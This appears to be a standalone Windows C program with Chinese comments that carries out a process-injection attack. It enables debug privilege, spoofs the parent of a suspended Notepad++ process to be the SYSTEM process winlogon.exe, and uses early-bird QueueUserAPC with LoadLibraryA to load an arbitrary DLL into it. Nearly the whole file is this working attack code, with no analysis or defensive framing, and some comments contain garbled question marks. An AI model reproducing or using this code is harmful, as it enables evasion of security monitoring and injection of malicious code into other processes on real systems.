#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>?
// 1. 提权函数：启用当前进程的调试权限 (SE_DEBUG_NAME)
// 这是打开 SYSTEM 进程句柄的必要前提
BOOL EnableDebugPrivilege() {
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
		CloseHandle(hToken);
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}
DWORD GetPidByName(const wchar_t* name) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (_wcsicmp(entry.szExeFile, name) == 0) {
				CloseHandle(snapshot); //thanks to Pvt Comfy
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);
	return 0;
}
int main() {
	// --- 配置 ---????
	// 目标选择一个系统路径下的程序????
	const char* targetPath = "C:\\Program Files\\Notepad++\\notepad++.exe";
	// 父进程选择 SYSTEM 权限的 winlogon.exe????
	const wchar_t* parentName = L"winlogon.exe";
	const char* dllPath = "F:\\Test\\InjectDll.dll";
	HANDLE hParent = NULL, hProcess = NULL, hThread = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
	LPVOID remoteBuf = NULL;
	BOOL bSuccess = FALSE;
	// A. 提升自身权限????
	if (!EnableDebugPrivilege()) {
		printf("[-] 提权失败，请以管理员身份运行！\n");
		return 1;
	}
	printf("[+] 提权成功 \n");
	do {
		// 1. 获取 SYSTEM 父进程句柄????????
		DWORD parentPid = GetPidByName(parentName);
		if (parentPid == 0) {
			printf("[-] 找不到父进程: %s\n", parentName);
			break;
		}
		// 需要 PROCESS_CREATE_PROCESS 权限来欺骗父进程????????
		hParent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION, FALSE, parentPid);
		if (!hParent) {
			printf("[-] 无法打开系统进程，错误码: %d\n", GetLastError());
			break;
		}
		// 2. 初始化属性列表????????
		SIZE_T attributeSize = 0;
		InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
		lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
		InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attributeSize);
		UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
		// 3. 创建挂起的进程????????
		STARTUPINFOEXA siex = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
		siex.lpAttributeList = lpAttributeList;
		// 使用 EXTENDED_STARTUPINFO_PRESENT 配合属性列表????????
		if (!CreateProcessA(NULL, (LPSTR)targetPath, NULL, NULL, FALSE,
			EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
			NULL, NULL, &siex.StartupInfo, &pi)) {
			printf("[-] 进程创建失败: %d\n", GetLastError());
			break;
		}
		hProcess = pi.hProcess;
		hThread = pi.hThread;
		printf("[+] 目标进程已创建 (PID: %d)，其父进程已伪造为 %s (SYSTEM)\n", pi.dwProcessId, parentName);
		// 4. 注入 DLL 路径????????
		SIZE_T pathLen = strlen(dllPath) + 1;
		remoteBuf = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!remoteBuf) break;
		WriteProcessMemory(hProcess, remoteBuf, dllPath, pathLen, NULL);
		// 5. 早鸟注入：QueueUserAPC????????
		FARPROC pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
		if (!QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)remoteBuf)) break;
		// 6. 恢复线程执行????????
		ResumeThread(hThread);
		bSuccess = TRUE;
		printf("[+] 注入指令成功提交！\n");
	} while (0);
	// 清理资源????
	if (lpAttributeList) {
		DeleteProcThreadAttributeList(lpAttributeList);
		HeapFree(GetProcessHeap(), 0, lpAttributeList);
	}
	if (hParent) CloseHandle(hParent);
	if (hProcess) CloseHandle(hProcess);
	if (hThread) CloseHandle(hThread);
	system("pause");
	return bSuccess ? 0 : 1;
}